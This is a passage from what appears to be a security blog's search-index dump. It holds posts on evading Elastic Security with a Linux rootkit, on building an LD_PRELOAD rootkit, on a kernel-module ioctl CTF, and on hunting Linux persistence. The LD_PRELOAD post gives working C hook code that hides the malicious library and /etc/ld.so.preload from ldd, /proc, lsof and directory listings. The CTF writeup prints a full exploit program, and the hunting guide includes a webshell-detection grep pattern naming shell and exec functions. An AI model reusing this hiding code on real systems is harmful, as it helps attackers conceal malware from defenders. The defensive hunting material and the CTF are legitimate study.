\u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eSecurity solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\u003c/p\u003e\n\u003cp\u003eThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\u003c/p\u003e","title":"Evading Elastic Security: Linux Rootkit Detection Bypass"},{"content":"Hello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is LD_PRELOAD Rootkit? Before we begin, we need to understand what an LD_PRELOAD rootkit is.\nIs a type of malware that uses the LD_PRELOAD environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel. Introduction A good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\nHowever a weak point in them is that for those who have created or know about LD_PRELOAD rootkits, you know that they are easy to detect and remove.\nAnd in this post, in addition to learning some techniques to detect an LD_PRELOAD rootkit, we will learn how to hide it, to prevent these detections mentioned in the post from catching it.\nDetecting LD_PRELOAD rootkit Most of the time LD_PRELOAD rootkits can be detected using ldd /bin/ls, like this:\nldd: Provides a list of the dynamic dependencies that a given program needs. It will return the name of the shared library and its location. They can also be found in /proc/[pid]/maps.\n/proc/[pid]/maps: A file containing the currently mapped memory regions and their access permissions. They can also be easily found in /proc/[pid]/map_files/\n/proc/[pid]/map_files/: Shows memory-mapped files. And of course, what you can\u0026rsquo;t miss is checking /etc/ld.so.preload\n/etc/ld.so.preload: File containing a separate list of shared objects to be loaded before the program. You can also check this using lsof.\nlsof: Lists files opened by processes and used with -p , it shows the shared libraries loaded by a specific process. And these are the main ways to detect a shared object, you saw how easy it is, right? And most of the LD_PRELOAD rootkits that I see, do not have a feature to hide from it, and as I am a very curious person, I decided to learn some ways on how to hide it and it is in the next session that we will learn.\nHiding an LD_PRELOAD Rootkit from ldd and /proc I think that for people who know me, they know that I really like hooking the read, and this case will be no different.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*real_read)(int, void *, size_t) = NULL; if (!real_read) { real_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); if (!real_read) { errno = ENOSYS; return -1; } } ssize_t result = real_read(fd, buf, count); if (result \u0026gt; 0) { char *start = (char *)buf; char *end = start + result; char *current = start; size_t new_buf_size = result; char *new_buf = (char *)malloc(new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } size_t new_buf_pos = 0; while (current \u0026lt; end) { char *line_start = current; char *line_end = memchr(current, \u0026#39;\\n\u0026#39;, end - current); if (!line_end) { line_end = end; } else { line_end++; } if (!memmem(line_start, line_end - line_start, \u0026#34;hook.so\u0026#34;, strlen(\u0026#34;hook.so\u0026#34;))) { size_t line_length = line_end - line_start; if (new_buf_pos + line_length \u0026gt; new_buf_size) { new_buf_size = new_buf_pos + line_length; new_buf = (char *)realloc(new_buf, new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } } memcpy(new_buf + new_buf_pos, line_start, line_length); new_buf_pos += line_length; } current = line_end; } memcpy(buf, new_buf, new_buf_pos); result = new_buf_pos; free(new_buf); } return result; } This code implements a hook in the read function, intercepting file readings and filtering lines that contain the string \u0026quot;hook.so\u0026quot;, using the dlsym function to obtain the original version of read, processing the data read, dynamically allocating memory to store the filtered result and returning this new buffer, while ensuring that any line with \u0026quot;hook.so\u0026quot; is deleted through functions like memm and memchr, effectively \u0026ldquo;hiding\u0026rdquo; the string by copying only the lines that don\u0026rsquo;t contain it to the final buffer.\nTherefore, it is not detected in ldd and by any file/directory in /proc/*.\nExample using ldd:\nExample using /proc/pid/maps:\nExample using /proc/pid/map_files/:\nExample using lsof:\nExample using cat /etc/ld.so.preload:\nThis is a simple solution, nothing too advanced, but it is quite effective.\nHiding from /etc/ld.so.preload As seen previously, the presented technique works, however, if you do cat /etc/ld.so.preload, as expected hook.so will not appear, however, if you use nano, for example, it will be seen there.\nAnd that\u0026rsquo;s bad for us.\nTo do this, we will hook the fopen, read and readdir functions to hide the file /etc/ld.so.preload, making it \u0026ldquo;impossible\u0026rdquo; to open, read or list in directories, and also causing it to be non-existent, for example, if you do a cat /etc/ld.so.preload, it returns No such file or directory.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;limits.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #define HIDDEN_FILE \u0026#34;/etc/ld.so.preload\u0026#34; FILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) { orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); } if (strcmp(pathname, HIDDEN_FILE) == 0) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*orig_read)(int, void *, size_t) = NULL; if (!orig_read) { orig_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); } char path[PATH_MAX]; snprintf(path, sizeof(path), \u0026#34;/proc/self/fd/%d\u0026#34;, fd); char actual_path[PATH_MAX]; ssize_t len = readlink(path, actual_path, sizeof(actual_path) - 1); if (len \u0026gt; 0) { actual_path[len] = \u0026#39;\\0\u0026#39;; if (strcmp(actual_path, HIDDEN_FILE) == 0) { errno = ENOENT; return -1; } } return orig_read(fd, buf, count); } struct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) { orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); } struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, \u0026#34;ld.so.preload\u0026#34;) != 0) { return entry; } } return NULL; } fopen: This function checks if the file is /etc/ld.so.preload, if so, prevents it from opening by returning NULL and setting the error to ENOENT (No such file or directory), otherwise, it calls the function fopen original to open other files normally. read: Before reading, the function checks whether the file associated with the fd (file descriptor) is /etc/ld.so.preload (using readlink to obtain the actual path of the file), if so, a error on the read, returning -1 and setting the error to ENOENT, otherwise it calls the original read function to read other files normally. readdir: This function reads directory entries and checks if the name of any entry is ld.so.preload, if it finds that name, it ignores the entry and continues the search, otherwise it returns the entry normally, that is, it becomes invisible if you try to read ls -lah /etc/ |grep ld.so.preload. And then, it becomes more \u0026ldquo;stealth\u0026rdquo;.\nChecking if ld.so.preload is listed in /etc/:\nChecking if you can see the contents of /etc/ld.so.preload:\nAnd of course this isn\u0026rsquo;t 100% perfect, but it\u0026rsquo;s cool to understand how this process works.\nPlot Twist Well\u0026hellip; here\u0026rsquo;s a very funny thing, the process of hiding /etc/ld.so.preload, presented in the post becomes useless when we use strace 😂.\nStrace: Diagnostic, debugging and instructional userspace utility for Linux. This does not work against strace, our code cannot hide from it, because it only handles the read function, while strace can also monitor system calls at the kernel level, where the hook.so is still visible.\nFinal consideration I hope you liked this post, and that you learned something from it, if you have any questions, please contact me on Twitter.\n","permalink":"http://localhost:1313/hacking/ldpreload-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ld_preload-rootkit\"\u003eWhat is LD_PRELOAD Rootkit?\u003c/h2\u003e\n\u003cp\u003eBefore we begin, we need to understand what an \u003ccode\u003eLD_PRELOAD rootkit\u003c/code\u003e is.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIs a type of malware that uses the \u003ccode\u003eLD_PRELOAD\u003c/code\u003e environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eA good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\u003c/p\u003e","title":"How detect a LD_PRELOAD rootkit and hide from ldd \u0026 /proc"},{"content":" Challenge Description In this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\nWhat we have:\nA hidden kernel module loaded at boot Character device at /dev/ioctl_dev Setup script (device.sh) that loads the module and shreds source files SSH access enabled (username: root, password: ioctl) Important Note: Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, SSH is enabled for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\nGetting Started - VM Access \u0026amp; SSH When you boot the VM, you\u0026rsquo;ll see the login screen. The credentials are straightforward:\nUsername: root Password: ioctl Setting Up SSH Access After logging in, the first thing you should do is check the VM\u0026rsquo;s IP address to enable SSH access. This makes the challenge much more comfortable as you can:\nCopy and paste code easily Use multiple terminal windows Access from your preferred terminal emulator Run ip a to get the network configuration:\nAs we can see, the VM has IP 192.168.200.165. Now we can SSH from our host machine:\nssh root@192.168.200.165 Initial Reconnaissance Now that we\u0026rsquo;re comfortably connected via SSH, let\u0026rsquo;s explore what we have on the system.\nChecking for the Device The challenge mentions a device at /dev/ioctl_dev. Let\u0026rsquo;s verify it exists:\nroot@hunter:~# ls -lah /dev/ioctl_dev crw------- 1 root root 237, 0 Nov 9 16:15 /dev/ioctl_dev Perfect! The device exists with:\nType: Character device (c) Permissions: root only Major number: 237 Minor number: 0 Reverse Engineering the Kernel Module Time to analyze the kernel object (device.ko)! I\u0026rsquo;ll be using binary ninja for this, but Ghidra or IDA work just as well.\nLoading device.ko into binary ninja After loading device.ko into binary ninja and letting it analyze, we can see several interesting functions in the symbol:\nKey functions identified:\nioctl_handler - The main function we need to understand init_module - Module initialization hide - Module hiding functionality cleanup_module - Module cleanup Analyzing ioctl_handler() This is where the magic happens! Let\u0026rsquo;s examine the decompiled code:\nint64_t ioctl_handler() { int64_t rdx_2; int32_t rsi_3; rdx_2 = __fentry__(); void* gsbase; int64_t rax = *(uint64_t*)((char*)gsbase + 0x28); int32_t var_7c; int32_t var_78; if (rsi_3 == 0xc0487213 \u0026amp;\u0026amp; !_copy_from_user(\u0026amp;var_7c, rdx_2, 0x48) \u0026amp;\u0026amp; var_7c == 0x1337dead \u0026amp;\u0026amp; var_78 == 0xcafebabe) { int64_t var_74; __builtin_strncpy(\u0026amp;var_74, \u0026#34;ROOTKIT{fake_flag_for_you}\u0026#34;, 0x1b); _copy_to_user(rdx_2, \u0026amp;var_7c, 0x48); } if (rax == *(uint64_t*)((char*)gsbase + 0x28)) return __x86_return_thunk(); __stack_chk_fail(); } findings:\nioctl Command Check: rsi_3 == 0xc0487213\nThis is the ioctl request number we need to use Buffer Size: _copy_from_user(\u0026amp;var_7c, rdx_2, 0x48)\nExpects exactly 0x48 bytes (72 bytes) Magic Value #1: var_7c == 0x1337dead\nFirst 4 bytes must be 0x1337DEAD Magic Value #2: var_78 == 0xcafebabe\nNext 4 bytes must be 0xCAFEBABE Understanding the init_module() Let\u0026rsquo;s also check how the device gets created:\nint64_t init_module() { __fentry__(); uint32_t rax = __register_chrdev(0, 0, 0x100, \u0026#34;ioctl_dev\u0026#34;, \u0026amp;fops); major = rax; if (rax \u0026gt;= 0) { uint64_t rax_1 = __class_create(\u0026amp;__this_module, \u0026#34;ioctl_class\u0026#34;, \u0026amp;__key.2); ioctl_class = rax_1; if (rax_1 \u0026lt;= -0x1000) { uint64_t rax_3 = device_create(rax_1, 0, (uint64_t)(major \u0026lt;\u0026lt; 0x14), 0, \u0026#34;ioctl_dev\u0026#34;); __key.2 = rax_3; if (rax_3 \u0026lt;= -0x1000) { hide(); _printk(0x400326); } } } return __x86_return_thunk(); } The device_create() call creates our /dev/ioctl_dev device with:\nDevice class: ioctl_class Device name: ioctl_dev Major number: dynamically allocated (237 in our case) After successful creation, it calls hide() to make the module invisible to lsmod.\nWriting the Exploit Now that we understand the requirements, let\u0026rsquo;s write our exploit code!\nThe Exploit Create a 72-byte buffer Write 0x1337DEAD at offset 0 Write 0xCAFEBABE at offset 4 Open /dev/ioctl_dev Call ioctl with command 0xc0487213 Read the flag from the returned buffer exploit.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { int fd; char buf[0x48]; uint32_t val1 = 0x1337DEAD; uint32_t val2 = 0xCAFEBABE; memset(buf, 0, sizeof(buf)); *(uint32_t*)buf = val1; *(uint32_t*)(buf + 4) = val2; fd = open(\u0026#34;/dev/ioctl_dev\u0026#34;, O_RDWR); if (fd \u0026lt; 0) { perror(\u0026#34;open\u0026#34;); return 1; } if (ioctl(fd, 0xc0487213, buf) \u0026lt; 0) { perror(\u0026#34;ioctl\u0026#34;); close(fd); return 1; } printf(\u0026#34;Flag: %s\\n\u0026#34;, buf); close(fd); return 0; } Compiling and Running Since we\u0026rsquo;re connected via SSH, we can easily copy the code and compile it:\nroot@hunter:~# gcc exploit.c -o exploit root@hunter:~# ./exploit Flag: ROOTKIT{ioctl_secret_unlocked@1337} Success! We\u0026rsquo;ve captured the flag!\nWhy It Works The exploit works because the kernel module uses the same buffer for both receiving input and sending output. We create a 72-byte buffer (buf[0x48]), write the magic values 0x1337DEAD and 0xCAFEBABE at the beginning using pointer casting ((uint32_t)buf), then open the device and call ioctl() with command 0xc0487213.\nThe kernel validates our magic values with _copy_from_user(), and if they match, uses _copy_to_user() with the same pointer to overwrite our buffer with the flag.\nKey Lessons Learned 1. Check dmesg for Kernel Activity Kernel messages provided crucial information about module loading and potential issues.\n2. Understand ioctl Communication The ioctl interface is a powerful way for userspace to communicate with kernel drivers. Understanding the command numbers and data structures is essential.\n3. Reversing Skills Being comfortable with tools like Ghidra, IDA, or Binary Ninja is crucial for kernel module analysis.\nConclusion This challenge was an excellent introduction to Reversing and you can learn:\nLinux kernel modules Reverse engineering Crafting ioctl requests Recognizing rootkit techniques Our Community Join the Rootkit Researchers community:\nDiscord Server\nChallenge created by Matheuz - Have fun guys!!\nThanks for reading! If you enjoyed this writeup, consider sharing it with others who might find it useful. Happy hacking!\n","permalink":"http://localhost:1313/hacking/ioctl-secrets/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/ZTjHU7a.jpeg\" alt=\"img\"  /\u003e\n\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cp\u003eIn this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhat we have:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eA hidden kernel module loaded at boot\u003c/li\u003e\n\u003cli\u003eCharacter device at \u003ccode\u003e/dev/ioctl_dev\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eSetup script (\u003ccode\u003edevice.sh\u003c/code\u003e) that loads the module and shreds source files\u003c/li\u003e\n\u003cli\u003eSSH access enabled (username: \u003ccode\u003eroot\u003c/code\u003e, password: \u003ccode\u003eioctl\u003c/code\u003e)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eImportant Note:\u003c/strong\u003e Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, \u003cstrong\u003eSSH is enabled\u003c/strong\u003e for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\u003c/p\u003e","title":"Ioctl Secrets Writeup"},{"content":" Hello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\nThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\nBelow is what we will cover in this post.\nSSH Keys Crontab Bashrc APT Privileged user \u0026amp; SUID bash Malicious Systemd Hunting LKM Rootkits LD_PRELOAD rootkit PAM Backdoor ACL init.d Motd Mount process for hide any pid. Webshells rc.local But before we start, we need to understand what persistence is.\nWhat is persistence? Persistence in Linux, refers to the ability of malware, such as rootkits, backdoors and we can also abuse common Linux features for malicious uses to remain active on the system even after reboots. These threats seek to maintain unauthorized access and conceal their presence, making them persistent challenges for detection and removal.\nSo now we understand what persistence is, to be able to defend our systems we need to know where to look and how to remove it, so let\u0026rsquo;s go!\nHunting for Malicious SSH Keys It is correct to say that the simplest method of maintaining persistence is using ssh keys, so it is always good before analyzing an infected machine, for example, to see if there is an ssh key that you do not know, you can view it this with just one command line.\nfor home_dir in /home/*; do [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; echo \u0026#34;HOME \\\u0026#34;$(basename \u0026#34;$home_dir\u0026#34;)\\\u0026#34;\u0026#34;; [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; cat \u0026#34;$home_dir\u0026#34;/.ssh/*; done ls -la -R /home/*/.ssh */.ssh/* With this, the attacker could simply add his public key to the authorized_keys of some home or get the private key, and return to the machine at any time, and whenever he wants without needing a password.\nHunting for crontab persistence. Persistence via crontab is also a very old persistence technique, but it is still used today, basically, crontab allows us to schedule commands, scripts and programs to be executed automatically at regular intervals of time, and with that we can simply schedule a cron to execute a malicious script or some command, below are some examples.\nIn this image we see a classic example of persistence using crontab, where the 5 asterisks represent that our task will be executed every 1 minute, under the root user and then we enter the path of our script.\nPaths for search cron persistence\ncat /etc/crontab ls -la /var/spool/* ls -la -R /var/cron* Hunting for bashrc persistence .bashrc is a script file used in Linux Bash to configure environment variables, aliases, and other terminal customizations. Thinking like an attacker, you could make a malicious alias so that when the victim runs a command, for example the ls command, it sends you a reverse shell, executes a script, among many others.\nYou can search using this command:\ncat /home/*/{.bashrc,.zshrc} ls -la /home/*/{.bashrc,.zshrc} Hunting APT command persistence In short, apt is a program package management system that has automatic resolution of dependencies between packages, easy package installation method, ease of operation, allows you to easily update your distribution, etc.\nBut until then there is nothing \u0026ldquo;malicious\u0026rdquo;, however, apt has a command called apt update, which is for updating packages, and it also has a directory in: /etc/apt/apt.conf.d.\nThe /etc/apt/apt.conf.d directory is used to manage apt specific configurations on the operating system.\nBut what if we can create a malicious configuration to be able to send a reverse shell to us every time someone uses the apt update command, yes, this is totally possible, below are some examples.\nYou can use this command to find and check them one by one.\nls -la -R /etc/apt/apt.conf.d Hunting for Privileged user \u0026amp; SUID bash In a real attack scenario, depending on the attacker can also put SUID permissions on binaries, for example bash to be able to use it with root permission, and also add a user so that he can use sudo su and be root without having to password by changing the file /etc/sudoers.\nScenario 1 Scenario 2 You can check using these commands below:\nfind / -perm /4000 2\u0026gt;/dev/null #for search suid binaries/files ls -la $(whereis bash) ls -la /etc/sudoers.d cat /etc/sudoers cat /etc/groups #Here you can also check if a user is in the wrong group Hunting for malicious systemd service Systemd is a startup and service management system it simplifies system startup and service management.\nA malicious attacker abuses systemd to create a malicious service, for example, to send a reverse shell every 1 minute.\nPersistence by a service in systemd, it is widely used, it is always good to see what services you have on your machine, a tip for this type of situation is to use pspy64 which is basically a real-time process monitor, and when a service in systemd for example is executed, it appears in pspy too, and the same goes for crontab.\nHere are some directories you can check:\nls -la /etc/systemd/system ls -la /lib/systemd/system ls -la /run/systemd/system ls -la /usr/lib/systemd/system ls -la /home/*/.config/systemd/user/ To stop the malicious service, simply run the commands:\nsystemctl stop malicious.service systemctl disable malicious.service rm malicious.service Hunting for Loadable kernel module Rootkits LKM (Loadable kernel module) rootkits are certainly an absurd challenge to hunt, as it simply hides, becomes invisible, and once it is invisible it is almost impossible to remove it, in technical details, rootkits use a function called list_del which basically removes from lsmod (list modules) that is capable of listing the machine\u0026rsquo;s kernel modules, the big problem with this is that rmmod (remove module) is not capable of removing a module that is not in lsmod, so rootkits are very efficient at remaining persistent without anyone being able to detect why this is one of the main objectives of a rootkit, to remain persistent and invisible, but in this part of the post, I will teach you some techniques that can help you find rootkits and detect them, however, as stated above, removing them is a difficult task and depends on the type of rootkit, if it is one you can find on github like for example diamorphine, it has the function of becoming visible again, and then you can remove it.\nAs you can see here, it is invisible and even if it is still in the system, you will not be able to remove it.\nBut diamorphine was also designed to be visible, by default which is by using kill -63 0 and then you can remove it.\nHunting without tools I will use the diamorphine rootkit as an example to do hunting.\nThe most basic thing to do when a rootkit is not in lsmod is to check the kernel log files, such as:\ndmesg /var/log/kern.log /var/log/dmesg* It is very important to view the kernel logs because when an LKM is entered, it generates logs there as well.\nWe can also view: /sys/kernel/tracing/available_filter_functions which is basically a feature in Linux that lists the functions available to filter events during kernel tracing.\nWe can also view all available functions with their respective addresses /sys/kernel/tracing/available_filter_functions_addrs\nIt is also very important that we check the files and commands:\n/proc/modules /proc/kallsyms /lib/modules /proc/* lsmod #to view modules ps aufwx #to view all process in machine ss -tunlpd #to view connections lsof -i -P -n #to view process in execution and file open /proc/*/maps /proc/*/cwd /proc/*/environ Hunting with tools Unhide I\u0026rsquo;ll start using unhide which is a forensic tool to find processes and TCP/UDP ports hidden by rootkits, Linux kernel modules or by other techniques.\nAs we can see in the image above, we hid a PID, and using unhide, we were able to find it.\nRkhunter (rootkit hunter) Rkhunter is a good tool, however it is based on known signatures/strings, that is, if you modify the functions you can easily bypass its detection, you can see this video using the D3m0n1z3dShell tool for this.\nHowever, for known rootkits and if they are inserted by default without any modification, rkhunter can easily detect them, in the case of diamorphine and other rootkits, if it is invisible to lsmod, depending on it it cannot detect it, which is the case with diamorphine, if I make the module visible, it detects it, otherwise it goes unnoticed.\nNow with the rootkit hidden again:\nHere is the log that rkhunter generates, and basically for it to detect if it really is the diamorphine rootkit, it uses signature/strings which is clearly very easy to bypass detection.\nThis is enough to avoid detection.\nAgain, rkhunter is good for rootkits that have not been modified and signature/strings already exist, but still, don\u0026rsquo;t trust it 100%.\nchkrootkit Chkrootkit is a rootkit detection tool on Unix-like systems. It scans the system for signs of malicious activity such as suspicious files, hidden processes, and modifications to system libraries.\nChkrootkit is good at detecting hidden processes and directory as well, but as mentioned on rkhunter, don\u0026rsquo;t trust chkrootkit 100% as it is still possible to avoid detection of an LKM rootkit.\nTracee EBPF Tracee is a runtime security and observability tool that helps you understand how your system and applications behave. Tracee uses eBPF, and it is a great forensics tool, in my opinion it is the best there is for detecting rootkits as well, as it also detects if a syscall has been hooked.\nOBS: To disable LKM insertion you can use sysctl for this:\nsudo sysctl -w kernel.modules_disabled=1 To return it to default, simply change the 1 to 0.\nHere are some talks and posts about tracee detecting LKM rootkits, it\u0026rsquo;s really worth watching!\nDetecting Linux Syscall Hooking Using Tracee\nBlackHat Arsenal 2022: Detecting Linux kernel rootkits with Aqua Tracee\neBPF Warfare - Detecting Kernel \u0026amp; eBPF Rootkits with Tracee\nHunting kernel rootkits with eBPF by Asaf Eitani \u0026amp; Itamar Maouda Kochavi\nBônus tools:\nLynis is a security auditing tool Tiger is a security audit tool #sudo apt install tiger -y Volatily #advanced memory forensics Hunting LD_PRELOAD Rootkits LD_PRELOAD rootkits are easier to hunt down and remove from the machine, because basically besides being Userland, most of them involve the use of shared object (*.so)\nIn this part, I will use a userland rootkit created by h0mbre\nSome LD_PRELOAD rootkits hide from /etc/ld.so.preload but it is possible to find it anyway.\nTo be able to confirm, it is always a good idea to check the binaries with ldd to see which shared objects it has.\nTo remove it, it\u0026rsquo;s very simple.\nAnd that\u0026rsquo;s it, it has already been removed from the machine.\nAs said, userland rootkits are much easier to detect and remove, below are some directories/files that are good to check.\n/lib/x86_64-linux-gnu /lib/* /usr/lib/x86_64-linux-gnu /usr/lib/* ls -la /etc/ld* cat /etc/ld.so.preload ldd /bin/ls ldd /bin/bash ldd /usr/bin/ssh ldd /usr/bin/netstat ldd /bin/* #check for shared object in binary, which you suspect ldd /usr/bin/* #check for shared object in binary, which you suspect /proc/*/maps Using volatily also helps a lot in this analysis process.\nHunting for PAM Backdoor PAM Backdoor is a well-known persistence technique, it works by manipulating the Pluggable Authentication Modules (PAM) authentication system. This allows unauthorized access to the system by granting a specific user privileged access regardless of correct credentials.\nI will use this repository that automates this persistence process.\nNow that the PAM Backdoor has been inserted, let\u0026rsquo;s search for it.\nOne thing we can do to detect something \u0026ldquo;abnormal\u0026rdquo; in it is to use strings, I downloaded a Normal Linux PAM on my machine and compiled it.\nMalicious pam_unix.so Here we\u0026rsquo;ll see in the strings that the password we used is there, called \u0026ldquo;hunt3r\u0026rdquo; on line 376, so we can do the same thing, look on lines 375 to 378 or so and see if there\u0026rsquo;s anything there.\nNormal pam_unix.so And now in the uninfected pam_unix.so, there is nothing interesting in these lines, so in an infected pam_unix.so, if you use the strings and analyze it, you will see the password that is used for unauthorized access\ncat /usr/include/type.h find / -name \u0026#34;pam_unix.so\u0026#34; 2\u0026gt;/dev/null ls -la /lib/security ls -la /usr/lib/security ls -la /lib/x86_64-linux-gnu/security ls -la /etc/pam.d/* Here are two repository links on github that automate persistence, you can read the code and understand it, maybe look for other ways to hunt.\nmadlib\nLinux PAM Backdoor\nHunting for ACL Persistence Just like in Active Directory/Windows, in Linux there is also an ACL, and this can be used to maintain persistence as well.\nIn a scenario where an attacker has compromised one of your Linux machines and knows that at any time he may lose access to the machine or a specific directory/file, he can abuse the ACL (access control list) by using the setfacl command to change Control access to a file or directory for any user you want, with whatever permissions you want.\nNow the user kali can access /root even without being root, because we changed the ACL of the /root directory for the user kali be able to have read, write and execute permissions.\nTo be able to do a hunt, it\u0026rsquo;s very simple, just use the command getfacl which basically displays the access control lists (ACLs) associated with files and directories and then use setfacl -b DIR/FILE for remove ACL.\nWe can also create a simple bash script to run and whatever it finds in ACL it will print on the screen.\n#!/bin/bash users=$(awk -F\u0026#39;:\u0026#39; \u0026#39;$1!=\u0026#34;root\u0026#34; {print $1}\u0026#39; /etc/passwd) check_acl_for_user() { local user=\u0026#34;$1\u0026#34; echo \u0026#34;Checking ACLs for user: $user\u0026#34; acl_output=$(getfacl -R /* | grep \u0026#34;^# file: \\|user:$user$\u0026#34;) if [[ -n \u0026#34;$acl_output\u0026#34; ]]; then echo \u0026#34;$acl_output\u0026#34; fi } for user in $users; do check_acl_for_user \u0026#34;$user\u0026#34; done Hunting init.d persistence init.d are the scripts that are executed at machine startup, that is, as soon as the machine is turned on, the scripts that are on it are executed, and this is like gold for an attacker, as he can simply add a reverse shell payload, or execute any script he wants, as soon as the machine starts/restarts.\nNow after reboot:\nTo remove it is quite simple.\nFor hunting just check these two directories:\nls -la /etc/init.d/* ls -la /etc/rc*.d/ Hunting MOTD Persistence MOTD (Message of the Day) is a message displayed to users when they log into a system, usually through SSH or the console. It is a way of providing important information, such as maintenance notices, usage policies, system news or any other relevant information to users.\nThis persistence technique basically consists of creating a malicious MOTD that when someone join into the machine using ssh for example, our Malicious MOTD will be executed, below is an example of how it works.\nBasically what we did was go to /etc/update-motd.d and create a new MOTD containing the path of a reverse shell script, so that as soon as someone sshs in, the reverse shell will be executed and Regardless of which user you enter, the shell will always be root, as ssh runs as root.\nTo be able to hunt you can check these directories looking for an Abnormal MOTD.\nls -la /etc/update-motd.d/* /usr/lib/update-notifier/update-motd-updates-available cat /etc/motd find / -name \u0026#34;*motd*\u0026#34; 2\u0026gt;/dev/null Hunting for hidden process mounted This technique of using mount to mount a process in another directory is quite old, but it\u0026rsquo;s worth knowing how it works and knowing how to undo it.\nTo be able to hunt, it\u0026rsquo;s very simple, just use the mount command to see what is mounted.\nmount mount|grep proc umount /proc/PID umount -l /proc/PID Hunting for webshells Of course, using webshells for persistence is an old technique. When an attacker gains access to a machine, even without elevated privileges, they can deploy a webshell. A webshell allows the attacker to access the machine, even without direct access to the server via browser/web and from there, the attacker can execute commands and even execute a reverse shell to gain access to the server without depending on the webshell.\nHere we have an example of a simple webshell in PHP.\nWe can detect it using this oneline and with tools too.\ngrep -rlE \u0026#39;fsockopen|pfsockopen|exec|shell|system|eval|rot13|base64|base32|passthru|\\$_GET|\\$_POST\\$_REQUEST|cmd|socket\u0026#39; /var/www/html/*.php | xargs -I {} echo 